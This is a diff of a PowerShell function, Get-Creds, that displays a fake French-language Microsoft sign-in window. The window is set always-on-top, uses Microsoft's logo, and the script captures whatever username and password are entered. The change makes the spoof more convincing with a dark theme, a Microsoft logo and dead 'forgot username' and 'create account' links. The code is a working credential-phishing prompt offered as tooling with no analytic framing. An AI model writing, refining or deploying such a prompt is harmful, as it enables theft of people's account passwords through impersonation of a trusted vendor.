@@ -8,31 +8,101 @@ function Get-Creds {
     $xaml = @"
 <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-        Title="Microsoft Account" 
+        Title="Microsoft" 
         WindowStartupLocation="CenterScreen"
         ResizeMode="NoResize"
-        Width="500" Height="550"
+        Width="600" Height="700"
         Topmost="True"
-        Background="White"
-        WindowStyle="SingleBorderWindow">
-    <Grid Background="White">
-        <StackPanel VerticalAlignment="Stretch" HorizontalAlignment="Stretch" Margin="40">
-            <TextBlock Text="microsoft" FontSize="28" FontWeight="Bold" Foreground="#0078D4" Margin="0,0,0,40"/>
-            <TextBlock Text="Connexion" FontSize="32" FontWeight="Bold" Foreground="#000" Margin="0,0,0,10"/>
-            <TextBlock Text="Entrez vos informations d'identification Microsoft." FontSize="14" Foreground="#666" Margin="0,0,0,40" TextWrapping="Wrap"/>
+        Background="#1F1F1F"
+        WindowStyle="SingleBorderWindow"
+        Foreground="White">
+    <Grid Background="#1F1F1F">
+        <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center" Width="500">
+            <!-- Logo Microsoft -->
+            <StackPanel Orientation="Horizontal" Height="60" Margin="0,0,0,40" VerticalAlignment="Center">
+                <Rectangle Width="15" Height="15" Fill="#F25022" Margin="0,0,5,0"/>
+                <Rectangle Width="15" Height="15" Fill="#7FBA00" Margin="0,0,5,0"/>
+                <Rectangle Width="15" Height="15" Fill="#00A4EF" Margin="0,0,5,0"/>
+                <Rectangle Width="15" Height="15" Fill="#FFB900" Margin="0,0,20,0"/>
+                <TextBlock Text="Microsoft" FontSize="24" FontWeight="Bold" Foreground="White" VerticalAlignment="Center"/>
+            </StackPanel>
             
-            <TextBlock Text="Adresse e-mail ou numéro de téléphone" FontSize="12" Foreground="#333" Margin="0,0,0,8" FontWeight="SemiBold"/>
-            <TextBox x:Name="UsernameBox" Padding="12" Height="40" Margin="0,0,0,20" Background="White" BorderThickness="1" BorderBrush="#CCC" FontSize="13"/>
+            <!-- Titre -->
+            <TextBlock Text="Se connecter" FontSize="32" FontWeight="Bold" Foreground="White" Margin="0,0,0,15"/>
             
-            <TextBlock Text="Mot de passe" FontSize="12" Foreground="#333" Margin="0,0,0,8" FontWeight="SemiBold"/>
-            <PasswordBox x:Name="PasswordBox" Padding="12" Height="40" Margin="0,0,0,30" Background="White" BorderThickness="1" BorderBrush="#CCC" FontSize="13"/>
+            <!-- Sous-titre -->
+            <TextBlock Text="Utilisez votre compte Microsoft." FontSize="15" Foreground="#C0C0C0" Margin="0,0,0,35"/>
             
-            <TextBlock x:Name="ErrorMessage" Text="" FontSize="12" Foreground="#D32F2F" Margin="0,0,0,15" TextWrapping="Wrap"/>
+            <!-- Email/Username -->
+            <TextBlock Text="Adresse e-mail ou numéro de téléphone" FontSize="13" Foreground="#C0C0C0" Margin="0,0,0,10"/>
+            <TextBox x:Name="UsernameBox" 
+                     Padding="12" 
+                     Height="40" 
+                     Margin="0,0,0,15" 
+                     Background="#2D2D2D"
+                     Foreground="White"
+                     BorderThickness="1"
+                     BorderBrush="#0078D4"
+                     FontSize="13">
+                <TextBox.Resources>
+                    <Style TargetType="TextBox">
+                        <Setter Property="CaretBrush" Value="White"/>
+                    </Style>
+                </TextBox.Resources>
+            </TextBox>
             
-            <Button x:Name="SignInButton" Content="Connexion" Height="40" Margin="0,0,0,20" Background="#0078D4" Foreground="White" FontSize="14" FontWeight="Bold" Cursor="Hand" BorderThickness="0"/>
+            <!-- Lien "Oublié nom d'utilisateur" -->
+            <TextBlock TextAlignment="Left" Margin="0,0,0,25">
+                <Hyperlink x:Name="ForgotLink" Foreground="#0078D4" Cursor="Hand" TextDecorations="None">Vous avez oublié votre nom d'utilisateur ?</Hyperlink>
+            </TextBlock>
             
+            <!-- Mot de passe -->
+            <TextBlock Text="Mot de passe" FontSize="13" Foreground="#C0C0C0" Margin="0,0,0,10"/>
+            <PasswordBox x:Name="PasswordBox" 
+                         Padding="12" 
+                         Height="40" 
+                         Margin="0,0,0,25" 
+                         Background="#2D2D2D"
+                         Foreground="White"
+                         BorderThickness="1"
+                         BorderBrush="#0078D4"
+                         FontSize="13">
+                <PasswordBox.Resources>
+                    <Style TargetType="PasswordBox">
+                        <Setter Property="CaretBrush" Value="White"/>
+                    </Style>
+                </PasswordBox.Resources>
+            </PasswordBox>
+            
+            <!-- Message erreur -->
+            <TextBlock x:Name="ErrorMessage" Text="" FontSize="12" Foreground="#E81123" Margin="0,0,0,20" TextWrapping="Wrap"/>
+            
+            <!-- Bouton Suivant -->
+            <Button x:Name="SignInButton" 
+                    Content="Suivant" 
+                    Height="40" 
+                    Margin="0,0,0,25"
+                    Background="#0078D4" 
+                    Foreground="White" 
+                    FontSize="15"
+                    FontWeight="SemiBold"
+                    Cursor="Hand"
+                    BorderThickness="0">
+                <Button.Resources>
+                    <Style TargetType="Button">
+                        <Style.Triggers>
+                            <Trigger Property="IsMouseOver" Value="True">
+                                <Setter Property="Background" Value="#1084D7"/>
+                            </Trigger>
+                        </Style.Triggers>
+                    </Style>
+                </Button.Resources>
+            </Button>
+            
+            <!-- Lien Créer compte -->
             <TextBlock TextAlignment="Center" Margin="0,0,0,0">
-                <Hyperlink x:Name="SignUpLink" Foreground="#0078D4" Cursor="Hand">Créer un compte Microsoft</Hyperlink>
+                <Run Text="Vous débutez avec Microsoft ? " Foreground="#C0C0C0"/>
+                <Hyperlink x:Name="SignUpLink" Foreground="#0078D4" Cursor="Hand" TextDecorations="None">Créer un compte</Hyperlink>
             </TextBlock>
         </StackPanel>
     </Grid>
@@ -47,12 +117,13 @@ function Get-Creds {
     $signInButton = $window.FindName("SignInButton")
     $errorMessage = $window.FindName("ErrorMessage")
     $signUpLink = $window.FindName("SignUpLink")
+    $forgotLink = $window.FindName("ForgotLink")
     
     $script:result = $null
     
     $signInButton.Add_Click({
         if ([string]::IsNullOrWhiteSpace($usernameBox.Text) -or [string]::IsNullOrWhiteSpace($passwordBox.Password)) {
-            $errorMessage.Text = "Veuillez entrer vos identifiants"
+            $errorMessage.Text = "Veuillez remplir tous les champs"
         }
         else {
             $script:result = @{
@@ -64,6 +135,7 @@ function Get-Creds {
     })
     
     $signUpLink.Add_Click({})
+    $forgotLink.Add_Click({})
     $usernameBox.Focus() | Out-Null
     $window.ShowDialog() | Out-Null
     
